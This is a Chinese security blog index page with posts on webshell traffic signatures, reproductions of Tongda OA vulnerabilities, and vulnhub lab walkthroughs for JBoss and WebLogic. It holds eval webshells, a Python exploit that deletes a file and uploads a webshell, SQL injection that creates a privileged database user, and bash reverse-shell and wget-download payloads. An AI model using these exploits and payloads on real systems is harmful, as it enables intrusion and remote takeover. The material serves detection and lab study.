<!DOCTYPE html>


<html lang="en">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> unevensails&#39;s blog</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">unevensails&#39;s blog</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-常见webshell工具流量特征分析"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/10/24/%E5%B8%B8%E8%A7%81webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/"
    >常见webshell工具流量特征分析</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/10/24/%E5%B8%B8%E8%A7%81webshell%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2022-10-24T08:35:49.000Z" itemprop="datePublished">2022-10-24</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>菜刀使用的webshell为一句话木马，特征非常明显</p>
<h5 id="常用一句话"><a href="#常用一句话" class="headerlink" title="常用一句话"></a>常用一句话</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP:    &lt;?php @eval($_POST[&#x27;zopo&#x27;]);?&gt;</span><br><span class="line">ASP:    &lt;%eval request(&quot;zopo&quot;)%&gt;</span><br><span class="line">ASP.NET:  &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;zopo&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="流量特征："><a href="#流量特征：" class="headerlink" title="流量特征："></a>流量特征：</h5><p>请求包中：ua头为百度爬虫</p>
<p>请求体中存在<em>eval，base64</em>等特征字符，且传递的payload为base64编码，并且存在固定的<em>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</em></p>
<p>请求体中执行结果响应为明文，格式为<em>X@Y，数据，X@Y</em></p>
<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>蚁剑的核心代码是由菜刀修改而来的，因此菜刀能用的一句话木马蚁剑也能用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;zopo&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="在使用默认编码器连接时"><a href="#在使用默认编码器连接时" class="headerlink" title="在使用默认编码器连接时"></a>在使用默认编码器连接时</h5><p><img src="https://img-blog.csdnimg.cn/bb1b190d8b324b1b8499613daf7c9e1e.png"><br>请求包的每个请求体都是*@ini_set(“display_errors”, “0”);@set_time_limit(0)*开头，且都存在base64等字符</p>
<p>响应包的返回格式都为随机数，数据，随机数</p>
<h5 id="在使用base编码和解码器连接时"><a href="#在使用base编码和解码器连接时" class="headerlink" title="在使用base编码和解码器连接时"></a>在使用base编码和解码器连接时</h5><p><img src="https://img-blog.csdnimg.cn/6de658d49e1f41a9939d799ff83b0df8.png"><br>请求包存在base64加密的eval命令执行</p>
<p>响应包的返回格式都为随机数，base64加密的数据，随机数</p>
<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>冰蝎有自带的冰蝎马，在server文件夹里<br><img src="https://img-blog.csdnimg.cn/eba1ec96a7154c72b90b358c47e2e1e4.png"></p>
<h4 id="冰蝎2-0"><a href="#冰蝎2-0" class="headerlink" title="冰蝎2.0"></a>冰蝎2.0</h4><p>我的冰蝎2.0找不到了，这里就简单概括一下，2.0中采用的是协商密钥机制。</p>
<h5 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h5><p>请求中返回包状态码为200，返回内容必定是16位的密钥</p>
<p>请求体中存在<em>Accept: text/html, image/gif, image/jpeg, *; q=.2, */</em>; q=.2*</p>
<h5 id="建立连接后"><a href="#建立连接后" class="headerlink" title="建立连接后"></a>建立连接后</h5><p>请求包的coockie格式格式都为<em>Cookie: PHPSESSID=; path=/；</em></p>
<h4 id="冰蝎3-0"><a href="#冰蝎3-0" class="headerlink" title="冰蝎3.0"></a>冰蝎3.0</h4><h5 id="在使用命令执行功能时"><a href="#在使用命令执行功能时" class="headerlink" title="在使用命令执行功能时"></a>在使用命令执行功能时</h5><p><img src="https://img-blog.csdnimg.cn/558862aa00f346e8838a9604bc8f0956.png"><br>请求包中Content-Length都为5720或5740(不知道为啥我抓的包是5780，可能是java版本问题)存在，且都存在</p>
<p><em>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9*</p>
<p><em>Cache-Control: no-cache</em></p>
<p><em>Pragma: no-cache</em></p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>哥斯拉的webshell可以自动生成<br><img src="https://img-blog.csdnimg.cn/2b5dc422e0d94229a693b2bbd6c31c17.png"><br>生成后的PHP木马为普通的一句话木马<br><img src="https://img-blog.csdnimg.cn/ee451b37cf394c3a9e50895aa99496ef.png"></p>
<h5 id="建立连接后-1"><a href="#建立连接后-1" class="headerlink" title="建立连接后"></a>建立连接后</h5><p><img src="https://img-blog.csdnimg.cn/88af8a8594274db69f354d8d3738af8a.png"><br>请求包中的cookie末尾都有;特征，且都存在<em>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/</em>;q=0.8*</p>
<p>响应包中都存在<em>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</em></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-通达OA漏洞复现"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/09/29/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
    >通达OA漏洞</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/09/29/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2022-09-29T05:22:06.000Z" itemprop="datePublished">2022-09-29</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/OA%E7%B3%BB%E7%BB%9F/">OA系统</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>通达OA 2013 sql注入<br>漏洞位置 /interface/ugo.php<br>由于单引号被urldecode函数解析了，一个单引号或两个单引号均无变化<br><img src="https://image.3001.net/images/20220927/1664270301_6332bfdd14713d7bdba89.png!small"></p>
<p>将单引号编码两次，成功绕过<br><img src="https://image.3001.net/images/20220927/1664270411_6332c04b7d950b52726c2.png!small"><br>尝试了一下联合，盲注，都不行，最后用报错注入成功爆出数据库<br><img src="https://image.3001.net/images/20220927/1664270727_6332c187a7cd21894b46e.png!small"><br>通达OA 11.6<br>该漏洞是任意文件删除配合任意文件上传RCE<br>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target=&quot;http://127.0.0.1/&quot;</span><br><span class="line">payload=&quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)</span><br><span class="line">input(&quot;Press enter to continue&quot;)</span><br><span class="line">print(&quot;[*]Deleting auth.inc.php....&quot;)</span><br><span class="line"></span><br><span class="line">url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;</span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(&quot;[*]Checking if file deleted...&quot;)</span><br><span class="line">url=target+&quot;/inc/auth.inc.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &#x27;No input file specified.&#x27; not in page:</span><br><span class="line">    print(&quot;[-]Failed to deleted auth.inc.php&quot;)</span><br><span class="line">    exit(-1)</span><br><span class="line">print(&quot;[+]Successfully deleted auth.inc.php!&quot;)</span><br><span class="line">print(&quot;[*]Uploading payload...&quot;)</span><br><span class="line">url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;</span><br><span class="line">files = &#123;&#x27;FILE1&#x27;: (&#x27;deconf.php&#x27;, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+&quot;/_deconf.php&quot;</span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line">if &#x27;No input file specified.&#x27; not in page:</span><br><span class="line">    print(&quot;[+]Filed Uploaded Successfully&quot;)</span><br><span class="line">    print(&quot;[+]URL:&quot;,url)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure>

<p>执行EXP<br><img src="https://image.3001.net/images/20220929/1664419192_633505781091dce44d60b.png!small"><br>成功上传一句话木马<br><img src="https://image.3001.net/images/20220929/1664419233_633505a10f2913acf3489.png!small"><br>蚁剑成功连接<br><img src="https://image.3001.net/images/20220929/1664419273_633505c92ba8d05bf0d56.png!small"><br>通达OA 11.7 sql注入<br>漏洞位置 /general/hr/manage/query/delete_cascade.php?condition_cascade<br>判断是否存在sql注入<br>尝试了一下sleep，exp都被过滤了，这里能用power代替</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,1,power(9999,99))</span><br></pre></td></tr></table></figure>

<p>回显正常<br><img src="https://image.3001.net/images/20220929/1664427547_6335261b6884993ca969c.png!small"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,1,power(9999,99))</span><br></pre></td></tr></table></figure>

<p>回显报错，可证明存在sql注入<br><img src="https://image.3001.net/images/20220929/1664427769_633526f92a34e59ea7739.png!small"><br>添加数据库用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#x27;test111&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;test111@123&#x27; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220929/1664427952_633527b0ab715a9d41722.png!small"><br>成功创建<br><img src="https://image.3001.net/images/20220929/1664428060_6335281c8b1391685bc1b.png!small"><br>给新创建的用户添加权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE `mysql`.`user` SET `Password` = &#x27;*5ADFDA524177A8EB24D7671EF80A46F95C68D4ED&#x27;, `Select_priv` = &#x27;Y&#x27;, `Insert_priv` = &#x27;Y&#x27;, `Update_priv` = &#x27;Y&#x27;, `Delete_priv` = &#x27;Y&#x27;, `Create_priv` = &#x27;Y&#x27;, `Drop_priv` = &#x27;Y&#x27;, `Reload_priv` = &#x27;Y&#x27;, `Shutdown_priv` = &#x27;Y&#x27;, `Process_priv` = &#x27;Y&#x27;, `File_priv` = &#x27;Y&#x27;, `Grant_priv` = &#x27;Y&#x27;, `References_priv` = &#x27;Y&#x27;, `Index_priv` = &#x27;Y&#x27;, `Alter_priv` = &#x27;Y&#x27;, `Show_db_priv` = &#x27;Y&#x27;, `Super_priv` = &#x27;Y&#x27;, `Create_tmp_table_priv` = &#x27;Y&#x27;, `Lock_tables_priv` = &#x27;Y&#x27;, `Execute_priv` = &#x27;Y&#x27;, `Repl_slave_priv` = &#x27;Y&#x27;, `Repl_client_priv` = &#x27;Y&#x27;, `Create_view_priv` = &#x27;Y&#x27;, `Show_view_priv` = &#x27;Y&#x27;, `Create_routine_priv` = &#x27;Y&#x27;, `Alter_routine_priv` = &#x27;Y&#x27;, `Create_user_priv` = &#x27;Y&#x27;, `Event_priv` = &#x27;Y&#x27;, `Trigger_priv` = &#x27;Y&#x27;, `Create_tablespace_priv` = &#x27;Y&#x27;, `ssl_type` = &#x27;&#x27;, `ssl_cipher` = &#x27;&#x27;, `x509_issuer` = &#x27;&#x27;, `x509_subject` = &#x27;&#x27;, `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = &#x27;mysql_native_password&#x27;, `authentication_string` = &#x27;&#x27;, `password_expired` = &#x27;Y&#x27; WHERE `Host` = Cast(&#x27;%&#x27; AS Binary(1)) AND `User` = Cast(&#x27;test111&#x27; AS Binary(7));</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220929/1664428366_6335294eb1502e2f52505.png!small"><br>利用注入点刷新权限<br><img src="https://image.3001.net/images/20220929/1664428440_63352998c24d50b82c311.png!small"><br>写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">set global slow_query_log=on;</span><br><span class="line">set global slow_query_log_file=&#x27;C:/tongda11.7/webroot/test.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-vulnhub--jboss"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/09/08/vulnhub--jboss/"
    >vulnhub--jboss</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/09/08/vulnhub--jboss/" class="article-date">
  <time datetime="2022-09-08T11:52:31.000Z" itemprop="datePublished">2022-09-08</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/vulnhub/">vulnhub</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h5 id="CVE-2017-7504-反序列化"><a href="#CVE-2017-7504-反序列化" class="headerlink" title="CVE-2017-7504 反序列化"></a>CVE-2017-7504 反序列化</h5><p>访问/jbossmq-httpil/HTTPServerILServlet，出现如下页面证明存在该漏洞</p>
<p><img src="https://image.3001.net/images/20220908/1662637492_6319d5b41c503b6238fad.png!small"></p>
<p>编译并生成序列化文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637541_6319d5e584d47c396d399.png!small"></p>
<p>生成带有序列化恶意数据的ser文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap &quot;bash -i &gt;&amp; /dev/tcp/192.168.103.134/4444 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637664_6319d660063729ce5626e.png!small"></p>
<p>开启nc监听</p>
<p><img src="https://image.3001.net/images/20220908/1662637682_6319d6728053b72490ec4.png!small"></p>
<p>向靶机发送攻击payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.103.134:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637721_6319d699d3512260df611.png!small"></p>
<p>成功反弹</p>
<p><img src="https://image.3001.net/images/20220908/1662637734_6319d6a6dc4fdde51e7f9.png!small"></p>
<h5 id="CVE-2017-12149-反序列化"><a href="#CVE-2017-12149-反序列化" class="headerlink" title="CVE-2017-12149 反序列化"></a>CVE-2017-12149 反序列化</h5><p>验证漏洞:访问/invoker/readonly，状态码为500,说明存在该漏洞</p>
<p><img src="https://image.3001.net/images/20220908/1662637753_6319d6b909250e8ddedfa.png!small"></p>
<p>编译并生成序列化文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637774_6319d6ce4ccc8c1efa21f.png!small"></p>
<p>生成带有序列化恶意数据的ser文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.103.227:4444</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637794_6319d6e2c29733ec93ad8.png!small"></p>
<p>nc监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637825_6319d7010172bab16cbdd.png!small"></p>
<p>向靶机发送攻击payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.103.134:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662637844_6319d7146ddeb27154237.png!small"></p>
<p>成功反弹</p>
<p><img src="https://image.3001.net/images/20220908/1662637859_6319d723778e362c88578.png!small"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-vulnhub--weblogic"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/09/08/vulnhub--weblogic/"
    >vulnhub--weblogic</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/09/08/vulnhub--weblogic/" class="article-date">
  <time datetime="2022-09-08T01:53:09.000Z" itemprop="datePublished">2022-09-08</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/vulnhub/">vulnhub</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h5 id="CVE-2017-10271-XMLDecoder反序列化"><a href="#CVE-2017-10271-XMLDecoder反序列化" class="headerlink" title="CVE-2017-10271 XMLDecoder反序列化"></a>CVE-2017-10271 XMLDecoder反序列化</h5><p>进入靶场</p>
<p><img src="https://image.3001.net/images/20220908/1662638159_6319d84fb9cc3e60f13a3.png!small"></p>
<p>点击链接，抓包，变更post请求方式，构造poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.103.134/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>将数据包传至重发模块，点击发送</p>
<p><img src="https://image.3001.net/images/20220908/1662638187_6319d86b3fdb668f4901b.png!small"></p>
<p>注：报错415，需要修改Content-Type:text/xml;charset=utf-8</p>
<p>成功反弹shell</p>
<p><img src="https://image.3001.net/images/20220908/1662638202_6319d87a4fe7f6deda6b5.png!small"></p>
<h5 id="cve-2018-2628-反序列化"><a href="#cve-2018-2628-反序列化" class="headerlink" title="cve-2018-2628 反序列化"></a>cve-2018-2628 反序列化</h5><p>攻击机ip：192.168.103.134</p>
<p>靶机ip：192.168.103.112</p>
<p>启动靶场</p>
<p><img src="https://image.3001.net/images/20220908/1662638248_6319d8a8df39cc2689b3c.png!small"></p>
<p>创建shell.sh文件准备反弹shell</p>
<p><img src="https://image.3001.net/images/20220908/1662638266_6319d8ba011b6267b9f9f.png!small"></p>
<p>开启http服务</p>
<p><img src="https://image.3001.net/images/20220908/1662638278_6319d8c6e6c67a3cf4087.png!small"></p>
<p>开启JRMPListener</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;wget 192.168.103.134/shell.sh&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662638292_6319d8d4b4085a02f6ce2.png!small"></p>
<p>执行poc脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exploit.py 192.168.103.112 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.103.134 1099 JRMPClient</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662638304_6319d8e07efac8a7652bd.png!small"><br>成功下载shell.sh</p>
<p><img src="https://image.3001.net/images/20220908/1662638316_6319d8ec2927fe30c21ad.png!small"></p>
<p>开启监听端口</p>
<p><img src="https://image.3001.net/images/20220908/1662638326_6319d8f6c6259c327dc85.png!small"></p>
<p>再次执行JRMPListener和poc脚本反弹shell</p>
<p><img src="https://image.3001.net/images/20220908/1662638341_6319d905e94c331ff5157.png!small"></p>
<p><img src="https://image.3001.net/images/20220908/1662638353_6319d911f15d2d6528825.png!small"></p>
<p>成功反弹</p>
<p><img src="https://image.3001.net/images/20220908/1662638367_6319d91fafb46c615cc83.png!small"></p>
<h5 id="cve-2018-2894-文件上传"><a href="#cve-2018-2894-文件上传" class="headerlink" title="cve-2018-2894 文件上传"></a>cve-2018-2894 文件上传</h5><p>进入靶场，找到漏洞利用点，修改工作路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20220908/1662638383_6319d92f48eac50e5632f.png!small"></p>
<p>bp抓包，传至重发模块发送，可以发现时间戳</p>
<p><img src="https://image.3001.net/images/20220908/1662638404_6319d94404038bad1feb4.png!small"><br>访问路径，上传成功</p>
